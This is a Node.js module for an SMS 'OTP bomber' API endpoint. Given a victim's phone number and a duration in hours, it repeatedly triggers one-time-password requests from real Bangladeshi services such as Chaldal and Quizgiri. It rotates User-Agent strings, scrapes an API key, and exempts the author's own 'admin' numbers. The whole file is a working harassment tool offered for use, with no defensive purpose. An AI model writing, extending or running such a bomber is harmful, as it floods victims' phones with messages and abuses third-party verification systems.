#!/usr/bin/env node
const axios = require("axios");
const fs = require("fs");
const path = require("path");

const admin = ["01882030873", "01518931383"]; // এখানে admin নম্বরগুলো দাও

// Random User-Agent generator
function randomUserAgent() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1"
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

// Sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Load config
const configPath = path.join(__dirname, "config.json");
let config = JSON.parse(fs.readFileSync(configPath, "utf8"));

// Prepare target with dynamic keys
async function prepareTarget(target) {
  if (target.name === "Quizgiri") {
    try {
      const res = await axios.get("https://app.quizgiri.com.bd/");
      const match = res.data.match(/x-api-key\s*=\s*"(.+?)"/);
      if (match) target.headers["x-api-key"] = match[1];
    } catch {}
  }
}

// Send request
async function sendRequest(target, number) {
  try {

    if (target.name === "Chaldal") {
      // POST with query params
      const queryParams = {};
      for (const key in target.queryParamsTemplate) {
        queryParams[key] = target.queryParamsTemplate[key].replace("__NUMBER__", number);
      }
      const url = target.base + "?" + new URLSearchParams(queryParams).toString();

      const res = await axios.post(url, {}, { headers: target.headers });
      if (res.status >= 200 && res.status < 300) {
        console.log(`[✔] ${target.name} → OTP sent to ${number}`);
      } else {
        console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
      }
      return;
    }

    await prepareTarget(target);

    let url = target.base + (target.route || "");
    let body = {};

    if (target.type === "GET") {
      if (target.queryParam) {
        url += "?" + new URLSearchParams({ [target.queryParam]: number }).toString();
      } else {
        url += number;
      }
    }

    if (target.type === "POST" && target.bodyTemplate) {
      body = JSON.parse(JSON.stringify(target.bodyTemplate).replace(/__NUMBER__/g, number));
    }

    const res = await axios({
      method: target.type,
      url,
      headers: {
        ...(target.headers || {}),
        "User-Agent": randomUserAgent(),
        "x-request-id": Math.random().toString(36).substring(2, 12)
      },
      data: body,
      validateStatus: () => true
    });

    if (res.status >= 200 && res.status < 300) {
      console.log(`[✔] ${target.name} → OTP sent to ${number}`);
    } else if (res.status === 429) {
      console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
    } else {
      console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
    }
  } catch (err) {
    console.log(`[ERROR] ${target.name} Exception → ${number} | ${err.message}`);
  }
}

// Bomber main function
let activeBombers = {};

async function bomber(number, hours) {
  const endTime = Date.now() + hours * 60 * 60 * 1000;
  activeBombers[number] = true;

  let attempt = 0;
  while (Date.now() < endTime && activeBombers[number]) {
    attempt++;
    console.log(`\n📌 Attempt #${attempt}`);
    for (const target of config.targets) {
      await sendRequest(target, number);
      await sleep(1000);
    }
  }
  delete activeBombers[number];
}

// API meta
const meta = {
  name: "start",
  version: "1.0.0",
  description: "Start bomber attack on a number",
  author: "Ove",
  method: "get",
  category: "bomber",
  path: "/start?number=&time="
};

// API handler
async function onStart({ res, req }) {
  const { number, time } = req.query;

  if (!number || !time) {
    return res.json({ error: "Missing parameters. Use ?number=&time=" });
  }

  if (!number.startsWith("01")) {
    return res.json({ error: "Invalid number. Must start with 01" });
  }

  if (admin.includes(number)) {
    return res.json({ error: "This number is protected (admin)" });
  }

  if (activeBombers[number]) {
    return res.json({ error: "Bomber already running on this number" });
  }

  bomber(number, parseInt(time));
  return res.json({
    message: `Bomber started on ${number} for ${time} hour(s)`,
    powered_by: "Wataru API"
  });
}

module.exports = { meta, onStart, activeBombers };
